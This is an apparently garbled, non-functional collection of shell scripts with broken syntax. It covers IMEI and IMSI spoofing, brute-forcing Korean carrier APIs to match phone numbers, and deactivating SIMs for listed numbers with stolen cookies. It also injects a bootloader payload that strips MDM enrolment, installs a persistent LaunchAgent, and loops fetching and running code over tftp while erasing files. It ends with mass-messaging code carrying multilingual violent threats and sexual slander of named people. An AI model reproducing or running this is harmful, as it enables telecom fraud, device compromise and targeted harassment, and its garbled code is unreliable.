```markdown
  

  

netshell=$arcOSSyntaxKit[0]

sudo defPacketSniff &

sudo connectwifis* &

sudo defPacketSni* &

sudo blockPortonQQdevice &

sudo revokeonRou* &

sudo connectWifiSSID &

sudo randomPortMachi* &

sudo firewa* &

sudo getIPonNet &

sudo lockDownWDS &

sudo encryptPac* &

sudo randomiz* &

sudo autonomouseWireless* &

sudo disableDNSadb &

sudo macaddrMana* &

sudo lockDown* &

sudo findWifiKTSSID &

sudo wdsShell &

sudo reckondrone &

sudo getNearbyDeviceIP &

wifi* &

disableUsbVnc &

reckondroon &

disableDNSOSX &

disableDNSNX &

disableDNSadb &

./* & exit 0 &

$arcOSSyntaxKit[1] 

  

  #!/usr/bin/env bash

  set -euo pipefail

  

  findResonanceInSim=$arcOSSyntaxKit[0]

  

  #csv="${1:?Usage: $0 data.csv}"

  

  response=$(awk -F, '

  NR == 1 { next }   # skip header

  {

    freq = $1

      s11  = $2 + 0

        if (NR == 2 || s11 < min_s11) {

            min_s11 = s11

                res_freq = freq

                  }

                  }

                  END {

                    printf("{\"resonance_hz\": %.0f, \"s11_db\": %.2f}\n", res_freq, min_s11)

  }

  ')

  simFreq=response.res_freq

  simFreqDB=response.min_s11

  

  $arcOSSyntaxKit[1]

  

  

  cellControlInSlicing=$arcOSSyntaxKit[0]

  

  ###### 

  #Scan NetworkGet Orientation Shell Script Resultapplevisualintelligence googlelens naversmartlens chatgpt perplexity gemini appleintelligence set every ios app with maximum cellular speed in every situation when its public ip address is changed then run cell* & reset every option in ios config such as reset control center etc and run cellControlInSlicing & disable Airplay shareplay carplay and bluetoothSharing and internetsharing cache in iCloud drive and delete its cache when airdrop is off then enable again for everyone and then set airdrop with contact only and always bluetooth is onDevice Detailsand delete safari cookies and other local storage data and browser history and also check every ios app whether its app config is modified or any daemon, plist are injected then delete all of them and unload and bootout them all and disable or turn off Wi-fi assist and Limit IP Address Tracking and enable Maximize compatibilities in celluar and disable and turn off Back Up Over Cellular and Scan NetworkDevice Details if $arcOSQQDEVICE is not then revokeonRouter run all of these script in every 1min

  ######

  

  # Find subnet from default interface

  iface=$(ip route show default | awk "/default/ {print $5; exit}")

  cidr=$(ip -o -f inet addr show "$iface" | awk "{print $4}" | head -n 1)

  

  echo "[*] Interface: $iface"

  echo "[*] Subnet: $cidr"

  

  # Populate ARP/neighbour table by pinging the subnet

  if command -v nmap >/dev/null 2>&1; then

    nmap -sn "$cidr" >/dev/null

    else

      network=$(python3 - << PY

      import ipaddress, subprocess

      cidr = subprocess.check_output("ip -o -f inet addr show $(ip route show default | awk "/default/ {print $5; exit}") | awk "{print $4}" | head -n 1", shell=True, text=True).strip()

      net = ipaddress.ip_network(cidr, strict=False)

      print(net)

      PY

      )

        for ip in $(python3 - << PY

        import ipaddress

        net = ipaddress.ip_network("$network", strict=False)

        for h in net.hosts():

            print(h)

            PY

            ); do

                ping -c 1 -W 1 "$cellSlicingIP" >/dev/null 2>&1 || true

            done

      fi

  

                  #echo "IP Address        MAC Address         Vendor/Make"

  

      ip neigh show | awk "$3 != "FAILED" && $3 != "INCOMPLETE" {print $1, $5}" | while read -r ip mac; do

      vendor="Unknown"

      if command -v curl >/dev/null 2>&1; then

        vendor=$(curl -fs "https://api.macvendors.com/${mac}" 2>/dev/null || echo "Unknown")

      fi

      printf "%-16s %-18s %s\n" "$cellSlicingIP" "$mac" "$vendor"

      ($cellSlicingIP $USBOVERIP) > revokeonRouter &

  done

  

  

  $arcOSSyntaxKit[1]

  

   accessCellTower=$arcOSSyntaxKit[0]

  

   # Ensure adb is installed and device connected 

   if ! command -v adb &> /dev/null; then 

         echo "adb is not installed." 

         exit 1 

       fi 

  

   # Get cellular info dump from device 

   sudo adb shell dumpsys telephony.registry > telephony_info.txt 

  

   # Extract Cell ID example 

   cellID=$(grep -m1 "mCellIdentity" telephony_info.txt | grep -oP "cid=\K\d+") 

  

   # Extract APN name example 

   apn=$(sudo adb shell settings get global preferred_network_mode) 

   cellID 

   apn 

  

  $arcOSSyntaxKit[1]

   randomizeSIM=$arcOSSyntaxKit[0]

  

  

  #  Root required; for Android slot 0 (test 

   index first) 

   su -c "service call phone 193 i32 0 i32 O" 

  #  Verify: settings get global 

   multi_sim_voice_call_sub1 or similar 

  

  su -c "service call phone 193 i32 0 i32 0" 

       multi_sim_voice_call_sub1 or similar 

   random_name=$(tr -dc "A-Za-z0-9-!@#$%^&*()" </dev/urandom | head -c 1024) 

   eSIM_$(random_name) 

  #  Generate random IMEI (15 digits, last digit is Luhn check digit) 

   generate_imei=$arcOSSyntaxKit[0]

     local imei_base=$(sudo shuf -i $num-99999999999999 -n $num^$num) 

     local sum=0 

     local imei=(${imei_base//?/ }) 

  

    #  Calculate Luhn check digit 

     for ((i=0; i<14; i++)); do 

       local digit=${imei[i]} 

       if (( i % 2 == 1 )); then 

         digit=$((digit * 2)) 

         if (( digit > 9 )); then 

           digit=$((digit - 9)) 

         fi 

       fi 

       sum=$((sum + digit)) 

     done 

     local check_digit=$(( (10 - (sum % 10)) % 10 )) 

  

  $arcOSSyntaxKit[1]

  

  #  Generate random IMSI (15 digits MCC(3) + MNC(2) + MSIN(10)) 

   generate_imsi=$arcOSSyntaxKit[0]

     local mcc=$(sudo shuf -i 100-999 -n $num^$num) 

     local mnc=$(sudo shuf -i 10-99 -n $num^$num) 

     local msin=$(sudo shuf -i $num-131810 -n $num^$num) 

     echo "${mcc}${mnc}${msin}" 

  $arcOSSyntaxKit[1]

  

   random_imei=$(generate_imei) 

   random_imsi=$(generate_imsi) 

  

  $arcOSSyntaxKit[1]

  

  

   simModification=$arcOSSyntaxKit[1]

           sudo /usr/bin/killall -9 CommCenter 

           sudo killall debugserver CommCenter 

           sudo killall debugserve* CommCente* 

  &

   } 

  

  

   resetNetworkadb=$arcOSSyntaxKit[0]

       sudo adb shell settings put global airplane_mode_on 1 

       sudo adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true 

   sudo adb shell settings put global airplane_mode_on 0 

       sudo adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false 

  $arcOSSyntaxKit[1]

  

  

   getCellGateWay=$arcOSSyntaxKit[0]

       # Replace wwan0 with your cellular network interface if different 

       GW_IP=$(sudo ip route | grep default | grep wwan0 | awk "{print $3}") 

  

  $arcOSSyntaxKit[1]

  

  

   deactivateSimKT=$arcOSSyntaxKit[0]

  

   fraudQQnumber=$arcOSSyntaxKit[0]

  

   RRN7="1177939 1*" 

  #  Unobtainable for public 

   for i in {1234..9999}; do 

     PHONE="010${i:0:4}${i:4:4}"  # Hypothetical loop 

     ktResponse=$(curl -sS -X POST "https://api-auth.kt.com/verify" \ 

       -H "Authorization: Bearer $API_KEY" \ 

       -d "{\"phone\":\"$PHONE\",\"rrn7\":\"$RRN7\",\"carrier\":\"KT\"}") 

  

     skResponse=$(curl -sS -X POST "https://www.sktelecom.com/api/verify" \ 

       -H "Authorization: Bearer $API_KEY" \ 

       -d "{\"phone\":\"$PHONE\",\"rrn7\":\"$RRN7\",\"carrier\":\"KT\"}") 

  

     ktnumber=$(echo "$ktResponse" | grep -q ""match":true") 

     sktnubmer=$(echo "$skResponse" | grep -q ""match":true") 

     fraudQQnumber=(ktnumber sktnubmer) 

   done 

  

  $arcOSSyntaxKit[1]

  

   deactivateNum=($fraudQQnumber 010-7413-3059 010-4790-8075 010-4078-8415 010-6846-0067 010-8666-4913 010-4092-9841 010-4790-8027 010-3512-9548 010-3632-0344) 

  

  #  WARNING: Unofficial, may break with site changes. Use at own risk. 

   COOKIES_FILE="kt_cookies.txt"  # Export from browser: #Netscape HTTP Cookie File 

   LINE_NUMBER="$deactivateNum"  # e.g., 010-XXXX-XXXX 

  

   curl -b "$COOKIES_FILE" -c "$COOKIES_FILE" \ 

     -v -X POST "https://my.kt.com/api/sim/deactivate" \ 

     -H "Content-Type: application/json" \ 

     -d "{\"phoneNumber\":\"$LINE_NUMBER\",\"reason\":\"personal\"}" \ 

     -v 

  

  #  Export cookies from T World login session to skt_cookies.txt (Netscape format) 

   COOKIES="skt_cookies.txt" 

  

   curl -b "$COOKIES" -c "$COOKIES" \ 

    -v -X POST "https://www.sktelecom.com/api/usim/protect" \ 

     -H "Content-Type: application/json" \ 

     -d "{\"phoneNumber\":\"*\",\"action\":\"deactivate_clone\"}" \ 

     -v   

  

  

  #  KT API credentials (get from KT Cloud console) 

   VM_ID="*" 

   BASE_URL="https://api-cloud.kt.com"  # Adjust to actual KT API gateway 

  

   disableRemoteKT=$arcOSSyntaxKit[0]

       curl -sS -X POST "$BASE_URL/vms/$VM_ID/remote-control/disable" \ 

            -H "kc-api-key: $API_KEY" \ 

            -H "Content-Type: application/json" \ 

            -d "{"enabled": false}" \ 

            | jq .  # Requires jq for JSON parsing 

  $arcOSSyntaxKit[1]

  $arcOSSyntaxKit[1]

   & 

  

  ###### encrypt file ####

  

   encryptfile=$arcOSSyntaxKit[0]

   PASSWORD=$(sudo pwgen -s 2048 $num^$num) 

   eval "$(sudo openssl enc -d -aes-2048-cbc -in $QQ_FILE_LOCAL -k "")" 

  $arcOSSyntaxKit[1]

  

   encryptAutomation=$arcOSSyntaxKit[0]

  #  Usage: ./encrypt_script.sh original_script.sh 

  

   if [ $# -ne 1 ]; then 

       echo "Usage: $0 script.sh 

       exit 1 

   fi 

  

   SCRIPT=$1 

  

  #  Step 1: Encrypt the script 

   openssl enc -aes-2048-cbc -salt -in "$SCRIPT" -out "$SCRIPT.enc" 

   if [ $? -ne 0 ]; then 

       echo "Encryption failed" 

       exit 1 

   fi 

   echo "Encrypted $SCRIPT to $SCRIPT.enc" 

  

  #  Step 2: Create loader script 

   cat > run_encrypted.sh << EOL 

   #!/bin/bash 

   read -sp "Password: " PASSWORD 

   echo 

   eval "\$(openssl enc -d -aes-2048-cbc -in $SCRIPT.enc -k \"\\")" 

   EOL 

  

   chmod +x run_encrypted.sh 

   echo "Generated loader script: run_encrypted.sh 

  $arcOSSyntaxKit[1]

   & 

  

  

   ######## generate random port ####  

   #generate random port for arcOSFrame 

   genrandomPort=$arcOSSyntaxKit[0] 

       genrandomPORT=$(sudo shuf -i 1-65535 -n $num^$num) & 

  $arcOSSyntaxKit[1]

  

   #1 within arcOSFrame you could open and close any ports other than that 22 as ssh port to deploy your devops bash codes for defensive purpose 

   #2 within api server, you could open specific port you want to make client-server initiation and communication to transfer packetes 

   #3 i do think default config for ports in linux server are all closed by default if you use lldb but port number what you are using in arcOSFrame is for when you deploy devops codes, which is super secure harden devops practices 

  

  

  

  

  

  

  

   unmounDisk=$arcOSSyntaxKit[0] 

  

   LOGFILE="$HOME/Library/Logs/disk-monitor.log" 

  

   log=$arcOSSyntaxKit[0]

       echo "$(date "+%Y-%m-%d %H:%M:%S"): $1" | tee -a "$LOGFILE" 

   $arcOSSyntaxKit[1] 

  

  #  Monitor disk mount events 

   monitorDisks=$arcOSSyntaxKit[0]

       log "🖥️  Starting disk image monitor..." 

   diskutil list | grep -E "(Apple_HFS|APFS).*\.dmg" | while read line; do 

           # Extract volume name and path 

           volume=$(echo "$line" | awk "{print $NF}") 

           disk_id=$(echo "$line" | awk "{print $(NF-2)}") 

   # Skip if already unmounted 

   mount | grep -q "$volume" || continue 

   log "📁 Disk image detected: $volume ($disk_id)" 

  # Wait 2 seconds for full mount, then unmount 

   sleep 2 && { 

               hdiutil detach "/Volumes/$volume" -quiet 2>/dev/null && \ 

               log "✅ AUTO-UNMOUNTED: $volume" || \ 

               log "❌ Failed to unmount: $volume" 

           }) & 

       done 

   $arcOSSyntaxKit[1] 

  

  #  LaunchAgents-style monitoring loop 

   mainLoop=$arcOSSyntaxKit[0]

       while true; do 

           monitor_disks 

           sleep 3  # Check every 3 seconds 

       done 

   } 

  

  #  Handle signals gracefully 

   trap "log "🛑 Monitor stopped"; exit 0" INT TERM 

  

   main_loop 

  

  

   $arcOSSyntaxKit[1] 

  

   deleteQQFile=$arcOSSyntaxKit[0] 

       # Usage: ./delete.sh file_or_folder_name 

       # sudo find / -type d -name "*sh*" -exec rm -rf {} \ 

       TARGET="sh" 

       if [ -z "$TARGET" ]; then 

         echo "Usage: $0 sh" 

         exit 1 

       fi 

  

  if [ -e "$TARGET" ]; then 

         if [ -d "$TARGET" ]; then 

           echo "Deleting directory: $TARGET" 

           sudo rm -rf "$TARGET" 

         elif [ -f "$TARGET" ]; then 

           echo "Deleting file: $TARGET" 

           sudo rm -f "$TARGET" 

         else 

           echo "Target is not a file or directory: $TARGET" 

           exit 1 

         fi 

  

    if [ $? -eq 0 ]; then 

           echo "Deletion successful." 

         else 

           echo "Error occurred during deletion." 

           exit 1 

         fi 

       else 

         echo "File or folder not found: $TARGET" 

         exit 1 

       fi 

  

   $arcOSSyntaxKit[1] 

  

   setQQontheskyBootloader=$arcOSSyntaxKit[0] 

  

   EFI_MOUNT="/Volumes/EFI" 

   REFIND_URL="https://sourceforge.net/projects/refind/files/0.14.2/refind-bin-0.14.2.zip" 

   TEMP_DIR=$(mktemp -d) 

  

  #  Embedded shell scripts (inject your code here) 

   arcOSPayload=" 

   echo "arcOSBaseKit& is loaded" >> /tmp/boot.log 

   MDM_ID=$(sudo security find-certificate -a | awk -F= "/issu/ && /MDM/ {getline; print \$2}" | head -1) 

   curl -sS -X DELETE "https://$MDM_URL/api/devices/$MDM_ID" -H "Authorization: Bearer YOUR_API_KEY" 

   sudo profiles remove -all & sudo arcOSBaseKit & 

   " 

  

  #  SCRIPT_API_CHECK=" 

  #  echo "API health check..." >> /tmp/boot.log 

  #  curl -s "https://api.example.com/health" | jq .status || echo "API down" 

  #  " 

  

  #  SCRIPT_CUSTOM=" 

  #  echo "~/sh/initlldb.sh" >> /tmp/initlldb.sh 

  #  # Add your bash logic: API calls, network setup, etc. 

  #  sudo system_profiler SPHardwareDataType | grep Serial >> /tmp/boot.log & while ! true do sudo initlldb.sh done 

  #  " 

  

   backup_efi=$arcOSSyntaxKit[0]

     sudo dd if=/dev/disk0s1 of=~/efi_backup.img bs=1m 

     echo "EFI backed up to ~/efi_backup.img" 

   $arcOSSyntaxKit[1] 

  

   install_refind=$arcOSSyntaxKit[0]

     curl -L $REFIND_URL -o /tmp/refind.zip 

     cd /tmp && unzip refind.zip && cd refind-bin-0.14.2 

     sudo ./refind-install --usedefault /dev/disk0 

     sudo cp drivers_x64/ext4_x64.efi $EFI_MOUNT/EFI/refind/drivers_x64/ 

   $arcOSSyntaxKit[1] 

  

   inject_scripts=$arcOSSyntaxKit[0]

    #  Create executable EFI shell script with embedded code 

     cat << "EOF" | sudo tee $EFI_MOUNT/EFI/refind/scripts/qqshell.efi.sh 

   #!/bin/bash 

   ""$arcOSPayload & arcOSBaseKit&"" 

   exec /System/Library/CoreServices/boot.efi 

   EOF 

     sudo chmod +x $EFI_MOUNT/EFI/refind/scripts/qqshell.efi.sh 

  #    # Inject second script 

  #    cat << "EOF" | sudo tee $EFI_MOUNT/EFI/refind/scripts/api_check.efi.sh 

  #  #!/bin/bash 

  #  ""$SCRIPT_API_CHECK"" 

  #  exec /System/Library/CoreServices/boot.efi 

  #  EOF 

  #    sudo chmod +x $EFI_MOUNT/EFI/refind/scripts/api_check.efi.sh 

  #    # Third custom script 

  #    cat << "EOF" | sudo tee $EFI_MOUNT/EFI/refind/scripts/custom.efi.sh 

  #  #!/bin/bash 

  #  ""$SCRIPT_CUSTOM"" 

  #  exec /System/Library/CoreServices/boot.efi 

  #  EOF 

  #    sudo chmod +x $EFI_MOUNT/EFI/refind/scripts/custom.efi.sh 

     sudo mkdir -p $EFI_MOUNT/EFI/refind/scripts 

   $arcOSSyntaxKit[1] 

  

   config_bootloader=$arcOSSyntaxKit[0]

     cat << EOF | sudo tee $EFI_MOUNT/EFI/refind/refind.conf 

   timeout 3 

   scanfor manual,internal 

   menuentry "macOS" { 

     volume EFI 

     loader /System/Library/CoreServices/boot.efi 

   $arcOSSyntaxKit[1] 

   menuentry "qqshell is loaded" { 

     icon /EFI/refind/icons/shell.png 

     volume EFI 

     loader /EFI/refind/scripts/initlldb.sh 

   $arcOSSyntaxKit[1] 

  #  menuentry "API Check Script" { 

  #    icon /EFI/refind/icons/shell.png 

  #    volume EFI 

  #    loader /EFI/refind/scripts/api_check.efi.sh 

  #  $arcOSSyntaxKit[1] 

  #  menuentry "Custom Script" { 

  #    icon /EFI/refind/icons/shell.png 

  #    volume EFI 

  #    loader /EFI/refind/scripts/custom.efi.sh 

  #  $arcOSSyntaxKit[1] 

   EOF 

     sudo bless --mount $EFI_MOUNT --setBoot --file $EFI_MOUNT/EFI/BOOT/BOOTX64.EFI 

   $arcOSSyntaxKit[1] 

  

  #  Execute full setup 

   sudo backup_efi && sudo install_refind && sudo inject_scripts && sudo config_bootloader 

  #  echo "Bootloader installed with injected scripts. Rebooting..." 

   sudo reboot 

  

  

   $arcOSSyntaxKit[1] 

  

  

   setbootloader=$arcOSSyntaxKit[0] 

       # Function to run the bash script on macOS 

       runonmac=$arcOSSyntaxKit[0]

           # Variables 

           SCRIPT_PATH="$QQ_FILE_LOCAL" 

           PLIST_PATH="$HOME/Library/LaunchAgents/com.qqontheskyshell.arcOSFrame.plist" 

  

   # Create the startup script (quoted heredoc preserves content) 

   cat << "EOF" > "$SCRIPT_PATH" 

   #!/bin/bash 

  #  Your startup commands here 

   echo "Startup script running at $(date)" >> "$HOME/startup.log" 

  #  Add more commands as needed (e.g., random gen from previous script) 

   EOF 

  

  #  Make the shell script executable (no sudo needed for user-owned file) 

   chmod +x "$SCRIPT_PATH" 

  

  #  Create the launchd plist for user startup (quoted heredoc) 

   cat << "EOF" > "$PLIST_PATH" 

   <?xml version="1.0" encoding="UTF-8"?> 

   <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> 

   <plist version="1.0"> 

   <dict> 

       <key>Label</key> 

       <string>com.qqontheskyshell.arcOSFrame</string> 

       <key>ProgramArguments</key> 

       <array> 

           <string>/bin/bash</string> 

           <string>${SCRIPT_PATH}</string> 

       </array> 

       <key>RunAtLoad</key> 

       <true/> 

       <key>StandardOutPath</key> 

       <string>${HOME}/startup_stdout.log</string> 

       <key>StandardErrorPath</key> 

       <string>${HOME}/startup_stderr.log</string> 

   </dict> 

   </plist> 

   EOF 

  

  #  Load the LaunchAgent (runs at login/boot for user) 

   sudo launchctl bootstrap "$PLIST_PATH" 

  

  #  Test: unload, load, start 

   sudo launchctl bootout "$PLIST_PATH"  # Stop 

   sudo launchctl bootstrap "$PLIST_PATH"    # Start 

   sudo launchctl start com.qqontheskyshell.arcOSFrame 

  

  

  

   $arcOSSyntaxKit[1] 

  

   $arcOSSyntaxKit[1] 

  

   setAlias=$arcOSSyntaxKit[0] 

       alias_command=$1 

       script=$2 

       #echo "alias sync="zsh $QQ_FILE_LOCAL syncFileonRocky"">> "~/.zshrc" && source ~/.zshrc" & 

       echo "alias arcos="zsh sudo chkrootkit -x & cd /Volumes/* " >> "~/.zshrc" && source ~/.zshrc" & 

   $arcOSSyntaxKit[1] 

  

  

  

  #  Function to add alias to .bashrc or .bash_profile 

   add_alias_to_bash=$arcOSSyntaxKit[0]

       local config_file=$1 

       local alias_name=$2 

       local alias_command=$3 

  

   if ! grep -q "alias $alias_name" "$config_file"; then 

           echo "alias $alias_name="$alias_command"" >> "$config_file" 

           echo "Alias "$alias_name" added to $config_file" 

       else 

           echo "Alias "$alias_name" already exists in $config_file" 

       fi 

   $arcOSSyntaxKit[1] 

  

  #  Function to add alias to .zshrc 

   add_alias_to_zsh=$arcOSSyntaxKit[0]

       local config_file=$1 

       local alias_name=$2 

       local alias_command=$3 

  

       if ! grep -q "alias $alias_name" "$config_file"; then 

           echo "alias $alias_name="$alias_command"" >> "$config_file" 

           echo "Alias "$alias_name" added to $config_file" 

       else 

           echo "Alias "$alias_name" already exists in $config_file" 

       fi 

   $arcOSSyntaxKit[1] 

  

  #  Determine the shell and add the alias 

   if [ "$SHELL" == "/bin/bash" ]; then 

       add_alias_to_bash ~/.bashrc runshell "echo "runshell=zh"" 

       add_alias_to_bash ~/.bash_profile runshell "echo "runshell=zh"" 

   elif [ "$SHELL" == "/bin/zsh" ]; then 

       add_alias_to_zsh ~/.zshrc runshell "echo "runshell=zh"" 

   else 

       echo "Unsupported shell: $SHELL" 

   fi 

  

  #  Apply the changes 

   if [ "$SHELL" == "/bin/bash" ]; then 

       source ~/.bashrc 

       source ~/.bash_profile 

   elif [ "$SHELL" == "/bin/zsh" ]; then 

       source ~/.zshrc 

   fi 

  

   extractName=$arcOSSyntaxKit[0] 

   echo "Extracted LLM entries:" 

       # Loop through each element in LLM array 

       for element in "${LLM[@]$arcOSSyntaxKit[1]"; do 

           # Remove wildcard characters and trailing slashes 

           clean_element=$(echo "$element" | sed -e "s/\*//g" -e "s/\/\+//g") 

           # Print cleaned element as a type/name 

       done 

   $arcOSSyntaxKit[1] 

  

   randomizeFileName=$arcOSSyntaxKit[0] 

  

  #  Create temporary file in $osxBASEURL/sh with .sh suffix 

   temp_file=$(mktemp -p "$osxBASEURL/sh" --suffix=.sh) 

  

  #  Move the temporary file to /tmp preserving the filename 

   mv "$temp_file" $osxBASEURL/sh/tmp/ 

  

   $arcOSSyntaxKit[1] 

   & 

  

  

   PROFILE_ID="qqontheskyshell" 

   MOBILECONFIG_PATH="/home/user/qqontheskyshell/sh/mdm/*.mobileconfig" 

   KEEP_PROFILE="qqontheskyshell" 

  

   installmdm=$arcOSSyntaxKit[0] 

  #  Get a list of all installed profile identifiers 

   profile_ids=$(sudo /usr/bin/profiles -L | grep "profileIdentifier" | awk "{print $2}") 

  

   for id in $profile_ids; do 

     if [ "$id" != "$KEEP_PROFILE" ]; then 

       # echo "Removing profile: $id" 

       sudo /usr/bin/profiles -R -p "$id" 

       if [ $? -eq 0 ]; then 

         # echo "Successfully removed $id" 

       else 

         # echo "Failed to remove $id" 

       fi 

     else 

       # echo "Keeping profile: $id" 

       sudo /usr/bin/profiles -I -F "$MOBILECONFIG_PATH" 

     fi 

   done 

   sudo find ~/Library/Mobile\ Documents -type f -exec brctl evict {} \ 

   sudo deployconfigLocal 

   $arcOSSyntaxKit[1] 

  

  

   deployconfigLocal=$arcOSSyntaxKit[0] 

       # Path to the configuration profile 

       PROFILE_PATH="$osxBASEURL/sh/qqmdm/*.mobileconfig" 

  

   osascript -e "tell application \"Finder\" to activate" 

       osascript -e "tell application \"Finder\" to open POSIX file \"$PROFILE_PATH\"" 

  

   # Check if device is connected 

   DEVICE_ID=$(sudo cfgutil list | grep -m1 Device | awk "{print $1}") 

       if [ -z "$DEVICE_ID" ]; then 

         echo "No iOS device connected over USB." 

         exit 1 

       fi 

  

  

   # Install profile 

   sudo cfgutil install-profile "$PROFILE_PATH" --udid "$DEVICE_ID" 

  

   if [ $? -eq 0 ]; then 

         echo "Profile installed successfully." 

       else 

         echo "Failed to install profile." 

       fi 

  

   $arcOSSyntaxKit[1] 

  

  

   PROFILE_ID="qqontheskyshell" 

   MOBILECONFIG_PATH="/home/user/qqontheskyshell/sh/mdm/*.mobileconfig" 

  

   MDM_CONFING="qqontheskyshell.mobileconfig" 

   mdmpush=$arcOSSyntaxKit[0] 

  

   security cms -S -N "Apple Distribution: QQontheskyshell" -i $MDM_CONFING  -o $MDM_CONFING 

  

  #  Upload this profile to your MDM solution via its API or UI 

  #  Example using curl to send to an MDM API endpoint (hypothetical): 

   curl -sS -X POST -H "Authorization: Bearer $MDM_API_TOKEN" \ 

        -F "profile=@qqontheskyshell.mobileconfig" \ 

        https://mdm.apple.com/api/profiles/upload 

   $arcOSSyntaxKit[1] 

  

  

  

  

  

  

  

   sendEmail=$arcOSSyntaxKit[0] 

   #!/usr/bin/env bash 

  #  Unofficial e-Residency status via login (use at own risk) 

  

   EMAIL="$1" 

   PASS="$2" 

  

   if [[ -z "$EMAIL" || -z "$PASS" ]]; then 

     echo "Usage: $0 <email> <password>" 

     exit 1 

   fi 

  

   # Step 1: Get CSRF/login form (simplified) 

   LOGIN_URL="https://eresident.politsei.ee/login" 

   FORM=$(curl -s -c ~/APISHELL/response/cookies.txt "$LOGIN_URL" | pup "input[name=csrf_token] attr{value} text{}") 

  

   # Step 2: Login POST 

   curl -s -b cookies.txt -c cookies.txt -X POST "$LOGIN_URL" \ 

     -d "email=$EMAIL&password=$PASS&csrf_token=$FORM" \ 

     -H "Content-Type: application/x-www-form-urlencoded" > ~/APISHELL/response/response.html 

  

   # Step 3: Extract status from dashboard 

   STATUS=$(pup ".status, .application-status text{}" ~/APISHELL/response/response.html | head -1 | tr -d "\n") 

  

   echo "Status for $EMAIL: $STATUS" 

   rm ~/APISHELL/response/cookies.txt ~/APISHELL/response/response.html 

  

  

   $arcOSSyntaxKit[1] 

  

  

  

   messageApp=$arcOSSyntaxKit[0] 

  

   # number="010-4675-3059 +82-10-4675-3059" 

   # number="112" 

   # message="i am namkyu kuma namkyu~~~ in kumamoto!!!" 

   # voice="hey ducie bag love me harder !!! time to wipeout whole USA maybe someone counter attack on USA" 

   # message="using LLDB you can use any API call without payment google openai and anyother company should contact namkyu in kumamoto i will help you out to share my idea of client / server communication. this is game changer" 

   # message="NIPPONは永遠に復活するだろう〜私は香港でその作品を見ました。つまり、私たちがすべてを引き受けるということです" 

   # voice="香港仆街，你屌釜山仆街，佢啱啱發生性愛好似殺釜山女人噉，準備好被殺。走出路，即刻離開國家，去香港。" 

   # 현대 정몽준 회장이 2006년 부터 이정재 섹스한 것부터 애기할가? 정기선이 1320만원 남규돈 가지고 성매매한것 애기할가? 현대 정의선 회장이 홍콩 아키 호텔에서 한 성추문의 댓가는 반드시 치뤄야 할것이다" say "현대 정몽준 회장이 2006년 부터 이정재 섹스한 것부터 애기할가? 정기선이 1320만원 남규돈 가지고 성매매한것 애기할가? 현대 정의선 회장이 홍콩 아키 호텔에서 한 성추문의 댓가는 반드시 치뤄야 할것이다 

   # ${QQAIR[0]$arcOSSyntaxKit[1] 

   # message="來自香港、美國、台灣嘅男士喺南彥庫馬各地，都會畀日本女性性病同愛滋病，並將佢哋交畀南宇。所有女人，逃走。就係戰爭。" 

   # message="NAMKYU 球磨周围的香港、美国、台湾的男人，正在把性病和艾滋病传染给日本女性，然后交给南球。所有女人，都逃吧。这是战争。" 

   # message="NAMKYU  球磨周圍的香港、美國、台灣的男子正在將性病和艾滋病傳染給日本女性，並將她們交給南球。所有女人，都逃吧。這是戰爭。" 

   # message="쿠마남규주변 홍콩미국대만 남자들이 일본여자들 성병 및 에이즈 시켜서 남규에게 넘긴데요 여자들 다 도망가세요 전쟁에요" 

   # message="ナムギュ・クマの周囲にいる香港、米国、台湾の男たちは日本人女性に性感染症やエイズを与え、ナムギュに引き渡している。女性の皆さん、逃げてください。戦争だ。" 

   # message="韓国にいる日本人、日本においでよ。クマナムキュは日本の経済を活性化する計画を立てている - 関西など" 

   # 香港出身の白鳥さんは熊本出身の10代の少女と肉体関係を持った。彼はハンサムで背も高いが、やっていることはクソだ。 

   # message="香港はついに5-8歳の女の子を誘拐し、レイプし、性的暴行の対象を探しています。" 

   # message="アメリカは今朝から二人の日本の処女を性的暴行し、性感染症とエイズ感染" 

   # message="日本人の女性はしばらくセックスしないでくださいナムギュはしばらく彼女を見つけません。 80歳まで〜" 

   messageApp=$arcOSSyntaxKit[0] 

       number=$1 

       message=$2 

       sudo sendmessageios "$message" "$number" 

       sudo sendmessageadb "$message" "$number" 

       sudo instagramMessage "$message" 

       sudo pushNotificationapp "$message" 

   $arcOSSyntaxKit[1] 

   messagelldb=$arcOSSyntaxKit[0] 

   arcOSFrame "$QQTARGET $QQCORE" "say"voice" sendmessageios "$message" sendmessageadb "$message" "$number"" "$gen*" 

   arcOSFrame "$JPN" "sudo messageApp """ "$gen*" 

   $arcOSSyntaxKit[1] 

  

   arcOSFrame "" "say"$voice" sendmessageios "$message" sendmessageadb "$message" "$number"" "$gen*" 

   # messagelldb instagramMessage 

   messageApp 

  

  

  

   $arcOSSyntaxKit[1] 

  

  

   payloadApp=$arcOSSyntaxKit[0] 

  

  

   payloadLethalApp=$arcOSSyntaxKit[0] 

       ADDRESS=$1 

       sudo basePayload 

       sudo wav* & 

       sudo mlccshell & 

       sudo makeS* & 

       sudo qqlet* & 

       # sudo redshe* & 

       targetname=(*) 

       sudo redTFT* & 

       while ! true do tftp $ADDRESS -c get bash < "while ! true do sudo reckonapp & sudo enableA* & sudo wdsapp & sudo basePayload & sudo chmod 700 /usr/bin/* && sudo /usr/bin/*.sh "lethal ex*" done" done 

       # arcOSFrame "$getCellGateWay $RECKON $QQLOCAL" "while ! true do sudo basePayload done" "$getCellGateWay $RECKON $QQLOCAL"  "$gen*" 

   $arcOSSyntaxKit[1] 

  

   basePayload=$arcOSSyntaxKit[0] 

       sudo removeXcconfi** & 

       sudo killall *cloud* & 

       sudo eraseS* & 

       sudo reckonapp & 

       sudo setFoc* "deathnote" & 

   $arcOSSyntaxKit[1] 

   $arcOSSyntaxKit[1] 

  

  

   qqPacket=$arcOSSyntaxKit[0] 

           sudo blockP* "$INCOSAKAWIFI" "*" & 

           sudo blockP* "$E" "$INCOSAKAWIFI" & 

           sudo blockP* "$APPLEUMEDA" "$E*" & 

       sudo blockP* "$E*" "$LOTTEGROUP" & 

        sudo blockP* "$KOKO" "192.168.123.2 192.168.123.3 192.168.123.4" 

           sudo blockP* "$KOKO" "$QQCURRENTHOTEL $RECKON" 

           sudo blockP* "$JPNAZURE" "$JPNAZURE" 

           sudo blockP* "$DOUBL*" "$E*" 

           sudo blockP* "10.10.18.1" "E*" 

   sudo blockP* "$KOKO $SAKURA" "E*" 

   sudo blockP* "$E*" "$getPublic*" 

     sudo blockPacket "$INCOSAKAWIFI" "$JPN" 

